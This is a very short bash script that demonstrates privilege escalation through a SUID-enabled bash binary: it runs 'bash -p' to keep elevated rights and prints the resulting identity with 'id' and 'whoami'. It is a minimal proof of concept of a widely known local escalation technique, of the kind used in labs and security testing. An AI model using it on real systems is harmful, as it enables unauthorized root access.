#!/bin/bash
# SUID bash privilege escalation via -p flag
set -euo pipefail
bash -p -c 'id && whoami'
